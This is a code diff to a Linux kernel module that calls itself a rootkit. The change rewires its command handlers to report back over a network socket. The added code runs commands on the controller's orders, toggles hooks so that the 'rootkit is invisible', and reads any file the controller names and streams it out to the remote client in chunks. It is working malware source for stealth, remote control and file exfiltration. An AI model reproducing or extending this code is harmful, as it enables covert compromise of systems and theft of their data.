@@ -9,11 +9,18 @@
 // Lenght of the shortest valid (opcode+args) combo. currently `hide`
 #define SHORTEST_PAYLOAD 1
 
-static void do_exec_sync(char *args, char *status_buf);
-static void do_exec_async(char *args, char *status_buf);
-static void do_hide(char *args, char *status_buf);
-static void do_upload(char *args, char *status_buf);
-static void do_download(char *args, char *status_buf);
+#define USE_NETWORK(bufsz)                                                     \
+    int status;                                                                \
+    char buf[bufsz] = { 0 };                                                   \
+    struct kvec vec = { 0 };                                                   \
+    struct msghdr hdr = { 0 };
+
+static int unimplemented(struct socket *sock, const char *cmd_name);
+static int do_exec_sync(struct socket *sock, char *args);
+static int do_exec_async(struct socket *sock, char *args);
+static int do_hide(struct socket *sock, char *args);
+static int do_upload(struct socket *sock, char *args);
+static int do_download(struct socket *sock, char *args);
 
 // map each command type to it's callback
 static cmd_callback cmd_callbacks[] = {
@@ -84,49 +91,135 @@ int cmd_build(struct command *cmd, const char *payload)
     return 0;
 }
 
-static void do_exec_sync(char *args, char *status_buf)
+static int do_exec_sync(struct socket *sock, char *args)
 {
-    int status;
+    USE_NETWORK(128)
     int ret;
 
     if ((ret = exec_sync(args, &status)) != 0)
     {
         // exec didn't happen, return non-zero
-        sprintf(status_buf, "couldn't exec `%s`. internal error code %d\n",
-                args, ret);
+        sprintf(buf, "couldn't exec. internal error code %d\n", ret);
     }
-    sprintf(status_buf, "execed `%s` successfully. status: %d\n", args, status);
+    sprintf(buf, "execed command successfully. status: %d\n", status);
+    if (status == 0)
+    {
+        // TODO: send last stdout bytes
+    }
+    else
+    {
+        // TODO: send last stderr bytes
+    }
+    vec.iov_base = buf;
+    vec.iov_len = strlen(buf);
+    if ((status = kernel_sendmsg(sock, &hdr, &vec, 1, vec.iov_len)) < 0)
+    {
+        pr_warn("commands: couldn't send hide status message: %d\n", status);
+        return -1;
+    }
+    return 0;
 }
 
-static void do_exec_async(char *args, char *status_buf)
+static int do_exec_async(struct socket *sock, char *args)
 {
-    sprintf(status_buf, "exec_async is not implemented yet.\n");
-    pr_err("commands: command exec_async is not implemented yet.\n");
+    return unimplemented(sock, "exec_async");
 }
 
-static void do_hide(char *args, char *status_buf)
+static int do_hide(struct socket *sock, char *args)
 {
-    int status;
+    USE_NETWORK(128)
 
     status = toggle_hooks();
     if (!status)
     {
-        sprintf(status_buf, "hooks are off. rootkit is not sneaky anymore!\n");
+        sprintf(buf, "hooks are off. rootkit is not sneaky anymore!\n");
     }
     else
     {
-        sprintf(status_buf, "hooks are on. rootkit is invisible!\n");
+        sprintf(buf, "hooks are on. rootkit is invisible!\n");
     }
+    vec.iov_base = buf;
+    vec.iov_len = strlen(buf);
+    if ((status = kernel_sendmsg(sock, &hdr, &vec, 1, vec.iov_len)) < 0)
+    {
+        pr_warn("commands: couldn't send hide status message: %d\n", status);
+        return -1;
+    }
+    return 0;
 }
 
-static void do_upload(char *args, char *status_buf)
+static int do_upload(struct socket *sock, char *args)
 {
-    sprintf(status_buf, "upload is not implemented yet.\n");
-    pr_err("commands: command upload is not implemented yet.\n");
+    return unimplemented(sock, "do_upload");
 }
 
-static void do_download(char *args, char *status_buf)
+// Try to open file, send OK/KO status
+// If OK, read file in chunks of 1024 and send them
+// After last chunk is sent, send DONE
+static int do_download(struct socket *sock, char *args)
 {
-    sprintf(status_buf, "download is not implemented yet.\n");
-    pr_err("commands: command download is not implemented yet.\n");
+    struct file *file = NULL;
+    loff_t pos = 0;
+    int len = 0;
+    USE_NETWORK(1024); // chunk size is 1024
+
+    file = filp_open(args, O_RDONLY, 0);
+    if (IS_ERR(file))
+    {
+        sprintf(buf, "KO: couldn't open file");
+        vec.iov_base = buf;
+        vec.iov_len = strlen(buf);
+        if ((status = kernel_sendmsg(sock, &hdr, &vec, 1, vec.iov_len)) < 0)
+        {
+            pr_warn("commands: download: couldn't send status message: %d\n",
+                    status);
+            return -1;
+        }
+        pr_err("commands: download: couldn't open file %s", args);
+        return 1;
+    }
+
+    while ((len = kernel_read(file, buf, 1024, &pos)) > 0)
+    {
+        vec.iov_base = buf, vec.iov_len = len;
+        if ((status = kernel_sendmsg(sock, &hdr, &vec, 1, vec.iov_len)) < 0)
+        {
+            pr_warn("commands: download: couldn't send file chunk: %d\n",
+                    status);
+            filp_close(file, NULL);
+            return -1;
+        }
+    }
+
+    filp_close(file, NULL);
+
+    // Finished with file. Send DONE:
+    sprintf(buf, "DONE");
+    vec.iov_base = buf;
+    vec.iov_len = strlen(buf);
+    if ((status = kernel_sendmsg(sock, &hdr, &vec, 1, vec.iov_len)) < 0)
+    {
+        pr_warn("commands: download: couldn't send DONE message: %d\n", status);
+        pr_err("commands: download: CLI is still waiting, good luck handling "
+               "this.\n");
+        return -1;
+    }
+
+    return 0;
+}
+
+static int unimplemented(struct socket *sock, const char *cmd_name)
+{
+    USE_NETWORK(128)
+    pr_err("commands: command %s is not implemented yet.\n", cmd_name);
+    sprintf(buf, "%s is not implemented yet.\n", cmd_name);
+    vec.iov_base = buf;
+    vec.iov_len = strlen(buf);
+    if ((status = kernel_sendmsg(sock, &hdr, &vec, 1, vec.iov_len)) < 0)
+    {
+        pr_warn("commands: couldn't send %s status message: %d\n", cmd_name,
+                status);
+        return -1;
+    }
+    return 0;
 }
